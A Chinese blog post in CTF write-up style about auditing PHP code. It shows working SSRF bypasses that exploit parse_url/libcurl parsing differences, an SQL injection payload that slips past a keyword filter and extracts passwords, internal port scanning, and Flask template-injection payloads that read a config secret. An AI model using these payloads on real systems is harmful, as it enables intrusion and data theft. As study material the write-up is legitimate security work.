---
title: '记录php代码审计'
date: 2019-08-16
updated: 2019-08-21
category: 'note'
tags:
  - 'php'
  - '代码审计'
lang: 'zh'
draft: false
---
## 怎么过去呢

```php
if(isset($_POST['url']) && parse_url($_POST['url'])['host']=='www.baidu.com')
{
    var_dump(parse_url($_POST['url'])['host']);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $_POST['url']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($curl);
    echo $content;
    curl_close($curl);
    $filename='download/'.rand().';img1.jpg';
    file_put_contents($filename,$content);
    echo $_POST['url'];
    $img="<img src=\"".$filename."\"/>";
    echo $img;
}
else
{
    echo "you need post url: http://www.ichunqiu.com";
}
```

这里主要还是利用`parse_url`这个函数

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf5.png)

其实这里利用的是一个`parse_url`和`libcurl`之间的差异

匹配规则：

```
php parse_url：
host: 匹配最后一个@后面符合格式的host

libcurl：
host：匹配第一个@后面符合格式的host
```

比如这个URL  
`http://u:p@a.com:80@b.com/`

`parse_url`解析结果  

```
schema: http 
host: b.com
user: u
pass: p@a.com:80
```

libcurl解析结果：

```
schema: http
host: a.com
user: u
pass: p
port: 80
后面的@b.com/会被忽略掉
```

这样我么就可以构造payload:

> url=file://@127.0.0.1:80@www.baidu.com/./..//var/www/html/flag.php

`parse_url`解析出`www.baidu.com`绕过if  
然后`curl`解析file协议

[ssrf绕过记录](https://www.cnblogs.com/afanti/p/9928371.html)  
[Some trick in ssrf and unserialize()](https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize\()/#trick2-libcurl-and-parse-url)

## parse\_url函数的问题

```php
<?php
error_reporting(0);
$_GET=Add_S($_GET);
$_POST=Add_S($_POST);
$_COOKIE=Add_S($_COOKIE);
$_REQUEST=Add_S($_REQUEST);
function Add_S($array)
{
foreach($array as $key=>$value){
            if(!is_array($value)){
                    $check= preg_match('/regexp|and|like|\"|%|insert|update|delete|union|into|load_file|outfile|\/\*/i', $value);
                    if($check)
                            {
                            exit("Hacker!");
                    }
            }else{
                    $array[$key]=Add_S($array[$key]);
            }
    }
return $array;
}

function Measurement_url()
{
    $url=parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    $Keyword=array("from","select","like","or");
    foreach($query as $key)
    {
    foreach($Keyword as $value)
    {
        if(preg_match("/".$value."/",strtolower($key)))
        {
            die("fuck u!");
        }
    }
}
}
?>
```

在`Add_S`函数中把一些关键字都给过滤了，同时还有一部分关键字是在`Measurement_url`函数中过滤的，但是这个函数中有一个`parse_url`函数

`http://127.0.0.1///info/parseurl.php?sql=select` 这种形式的URL经过`parse_url`后会返回false。。

于是可以绕过的payload如下

`http://118.126.113.78///web1/?id=1' ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+`

具体`parse_url`漏洞的分析可以参考一叶飘零师傅的[文章](https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/)

然而我在本地测试的时候：  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php2.png)  
并没有成功，php的版本：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php3.png)  
这就很奇怪了

```php
<?php 
$url = "http://localhost///web/trick1/parse.php?sql=select";

$parse_url_result = parse_url($url);

print_r($parse_url_result);

 ?>
```

## 一道入群题

```php
<?php 
highlight_file(__FILE__);
function check_inner_ip($url) 
{ 
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url); 
    if (!$match_result) 
    { 
        die('url fomat error'); 
    } 
    try 
    { 
        $url_parse=parse_url($url); 
    } 
    catch(Exception $e) 
    { 
        die('url fomat error'); 
        return false; 
    } 
    $hostname=$url_parse['host']; 
    $ip=gethostbyname($hostname); 
    $int_ip=ip2long($ip); 
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; 
} 

function safe_request_url($url) 
{ 
     
    if (check_inner_ip($url)) 
    { 
        echo $url.' is inner ip'; 
    } 
    else 
    {
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_HEADER, 0); 
        $output = curl_exec($ch); 
        $result_info = curl_getinfo($ch); 
        if ($result_info['redirect_url']) 
        { 
            safe_request_url($result_info['redirect_url']); 
        } 
        curl_close($ch); 
        var_dump($output); 
    } 
     
} 

$url = $_GET['url']; 
if(!empty($url)){ 
    safe_request_url($url); 
} 

?>
```

很明显这是一道ssrf的题目，白名单，只能用如下协议`http|https|gopher|dict`

两个payload均可

```
payload1: ?url=http://127.0.0.1./flag.php
payload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php
```

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf6.png)

然后开始爆破内网的ip和端口

居然不记得怎么用Burp同时爆破两个字段了，查了一下 [https://bbs.ichunqiu.com/thread-17395-1-1.html](https://bbs.ichunqiu.com/thread-17395-1-1.html)  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf7.png)

可以得到172.11.243.81:8080和172.11.243.218:3306，分别为一个flask服务和mysql服务。

通过http访问内网的flask

得到源码

```python
import flask
import os
app = flask.Flask(__name__)
app.config['HINT'] = os.environ.pop('HINT')
@app.route('/')
def index():
    return open(__file__).read()
@app.route('/yulige/<path:yulige>')
def yulige(yulige):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(yulige))
if __name__ == '__main__':
    app.run("0.0.0.0",port=8080)
```

模板注入得到HINT

payload

```
#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}
#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}
```

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf8.png)

string(29) “mysql\_user\_is\_yuligeeee123321”
